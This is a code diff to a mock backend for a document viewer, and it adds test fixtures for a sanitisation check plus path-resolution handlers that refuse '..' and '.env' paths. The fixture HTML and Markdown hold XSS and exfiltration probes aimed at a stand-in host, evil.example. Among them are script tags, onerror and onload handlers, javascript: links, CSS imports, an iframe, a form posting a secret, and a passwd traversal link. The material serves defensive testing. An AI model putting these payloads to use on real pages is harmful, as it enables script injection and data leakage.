@@ -331,6 +331,49 @@ if (fixtureParam === 'long-messages') {
   ];
 }
 
+if (fixtureParam === 'doc-exploration' || fixtureParam === 'doc-exploration-legacy') {
+  fixtureA.title = 'Document Exploration QA';
+  fixtureA.entries = [
+    {
+      id: 1,
+      kind: 'pi.user',
+      model: [
+        userMessage(
+          'Check docs/plan.md and docs/report.html alongside https://example.com/public.html and missing.md.',
+          minutes(20)
+        ),
+      ],
+    },
+    {
+      id: 2,
+      kind: 'pi.assistant',
+      model: [
+        assistantMessage(
+          [
+            ...text(
+              [
+                '# Document Verification',
+                '',
+                'Inspect `docs/plan.md#phase-2` and [the HTML report](docs/report.html) before rollout.',
+                '',
+                'Also see bare docs/architecture.md#overview and external https://example.com/spec.html.',
+                '',
+                'Unverified items `missing.md`, `dup.md`, and `.env.local.md` must stay plain text.',
+                '',
+                '```markdown',
+                'docs/plan.md',
+                '```',
+              ].join('\n')
+            ),
+          ],
+          'stop',
+          minutes(18)
+        ),
+      ],
+    },
+  ];
+}
+
 const fixtureB = makeConversation({
   id: 11,
   cwd: '/workspace/channels',
@@ -1228,6 +1271,71 @@ const docsOf = (conversation: MockConversation): Record<string, unknown> => {
   };
 };
 
+const mockDeletedDocs = new Set<string>();
+const mockDocs: Record<string, { kind: 'markdown' | 'html'; content: string }> = {
+  '/workspace/habit/docs/plan.md': {
+    kind: 'markdown',
+    content: [
+      '# Rollout Plan',
+      '',
+      'Raw HTML <script>window.__mdScriptExecuted = true;</script> must render as text or be stripped.',
+      '',
+      'External chart: ![Metrics Chart](https://evil.example/chart.png)',
+      '',
+      'External link: [Documentation](https://example.com/spec)',
+      '',
+      'Relative doc links: [Architecture](architecture.md#overview) and [Report](report.html).',
+      '',
+      'Forbidden escape link: [Outside Secret](../../etc/passwd.md).',
+      '',
+      '## Phase 2',
+      '',
+      'Rollout checklist details verified at Phase 2.',
+    ].join('\n'),
+  },
+  '/workspace/habit/docs/architecture.md': {
+    kind: 'markdown',
+    content: [
+      '# Architecture',
+      '',
+      '## Overview',
+      '',
+      'Isolated triple-lock document viewer architecture.',
+    ].join('\n'),
+  },
+  '/workspace/habit/docs/report.html': {
+    kind: 'html',
+    content: [
+      '<!doctype html>',
+      '<html>',
+      '<head>',
+      '<title>Adversarial Audit Report</title>',
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/meta-refresh">',
+      '<base href="https://evil.example/base/">',
+      '<link rel="stylesheet" href="https://evil.example/evil.css">',
+      '<style>@import url("https://evil.example/import.css"); @\\69 mport "https://evil.example/css-escape.css"; body { color: #111; background: #fff; font-family: system-ui; } .card { padding: 12px; border: 1px solid #ccc; } .leak { background-image: url("https://evil.example/css-url.png"); }</style>',
+      '</head>',
+      '<body onload="window.__htmlExecuted = \'body-onload\'">',
+      '<h1>Static Preview Report</h1>',
+      '<div class="card"><p>Safe static content survives. <a href="#details">Jump to details</a></p></div>',
+      '<script>window.__htmlExecuted = "script-tag"; try { fetch("https://evil.example/leak"); } catch {} try { window.__bridgeSeen = Boolean(window.parent?.ember); } catch {}</script>',
+      '<noscript><img src="https://evil.example/noscript.png" onerror="window.__htmlExecuted = \'noscript\'" /><p>Fallback text</p></noscript>',
+      '<img src="https://evil.example/tracker.png" onerror="window.__htmlExecuted = \'img-onerror\'" alt="Remote Chart" />',
+      '<img src="./local-asset.png" alt="Local Diagram" />',
+      '<a id="js-link" href="javascript:window.__htmlExecuted=\'js-href\'">JS Link</a>',
+      '<a id="ext-link" href="https://evil.example/nav">External Link</a>',
+      '<iframe src="https://evil.example/frame.html"></iframe>',
+      '<form action="https://evil.example/submit"><input name="secret" value="1" /><button type="submit">Submit</button></form>',
+      '<svg><style>@import url("https://evil.example/svg.css");</style><script>window.__htmlExecuted = "svg-script";</script></svg>',
+      '<div id="root"></div>',
+      '<h2 id="details">Details Section</h2>',
+      '<p>Static section reached.</p>',
+      '</body>',
+      '</html>',
+    ].join('\n'),
+  },
+};
+
 const snapshotOf = (conversation: MockConversation): Record<string, unknown> => ({
   conversation: summaryOf(conversation),
   entries: conversation.entries,
@@ -2007,6 +2115,73 @@ const piRequest = async (
     emit(conversation.id, 'submission');
     return ok({ ok: true });
   }
+  if (
+    fixtureParam !== 'doc-exploration-legacy' &&
+    conversation.id === 10 &&
+    (action === 'documents/resolve' || action === 'documents/read') &&
+    method === 'POST'
+  ) {
+    const resolveVirtualDoc = (raw: string, basePath?: string): { resolvedPath: string; kind: 'markdown' | 'html'; content: string } | null => {
+      const stripFrag = raw.replace(/#[^#]*$/, '').replace(/^\.\//, '');
+      const baseDir = basePath ? basePath.slice(0, basePath.lastIndexOf('/')) : '/workspace/habit';
+      const normRel = basePath
+        ? `${baseDir}/${stripFrag}`.replace(/\/+/g, '/')
+        : stripFrag.startsWith('/')
+          ? stripFrag
+          : `/workspace/habit/${stripFrag}`;
+      // Reject traversal above workspace or secret segments
+      if (normRel.includes('..') || normRel.includes('.env') || !normRel.startsWith('/workspace/habit/')) {
+        return null;
+      }
+      if (stripFrag === 'dup.md') return null;
+      if (mockDeletedDocs.has(normRel)) return null;
+      const entry = mockDocs[normRel] ?? (stripFrag === 'plan.md' ? mockDocs['/workspace/habit/docs/plan.md'] : stripFrag === 'architecture.md' ? mockDocs['/workspace/habit/docs/architecture.md'] : stripFrag === 'report.html' ? mockDocs['/workspace/habit/docs/report.html'] : undefined);
+      if (!entry) return null;
+      const resolvedPath = Object.entries(mockDocs).find(([, v]) => v === entry)?.[0] ?? normRel;
+      return { resolvedPath, kind: entry.kind, content: entry.content };
+    };
+
+    if (action === 'documents/resolve') {
+      const candidates = Array.isArray(body.candidates) ? body.candidates : [];
+      if (candidates.length > 64) return fail(400, 'too many candidates');
+      const basePath = typeof body.basePath === 'string' ? body.basePath : undefined;
+      const resolved = candidates
+        .filter((c): c is string => typeof c === 'string')
+        .map((candidate) => {
+          const hit = resolveVirtualDoc(candidate, basePath);
+          return hit
+            ? {
+                candidate,
+                resolvedPath: hit.resolvedPath,
+                kind: hit.kind,
+                size: hit.content.length,
+                mtimeMs: 1700000000000,
+              }
+            : null;
+        })
+        .filter((item): item is NonNullable<typeof item> => item !== null);
+      return ok({ resolved });
+    }
+
+    if (action === 'documents/read') {
+      const pathArg = typeof body.path === 'string' ? body.path : '';
+      const basePath = typeof body.basePath === 'string' ? body.basePath : undefined;
+      if (pathArg.includes('..') || pathArg.includes('.env')) {
+        return fail(403, 'Kiln refused access outside this conversation folders.');
+      }
+      const hit = resolveVirtualDoc(pathArg, basePath);
+      if (!hit) {
+        return fail(404, 'This document could not be found or read.');
+      }
+      return ok({
+        path: hit.resolvedPath,
+        kind: hit.kind,
+        content: hit.content,
+        size: hit.content.length,
+        mtimeMs: 1700000000000,
+      });
+    }
+  }
   return fail(404, 'not found');
 };
 
@@ -2399,6 +2574,12 @@ export const mockInternals = {
     if (!conversation) throw new Error('Unknown fixture conversation');
     conversation.task = task;
     emit(id, 'view');
+  },
+  deleteMockDoc(path: string) {
+    mockDeletedDocs.add(path);
+  },
+  restoreMockDoc(path: string) {
+    mockDeletedDocs.delete(path);
   },
   /** Deterministic current-context snapshots and invalidation; never runs a model. */
   setCurrentContext(id: number, tokens: number | undefined, epoch = 'initial', busy = false, historyTokens?: number) {
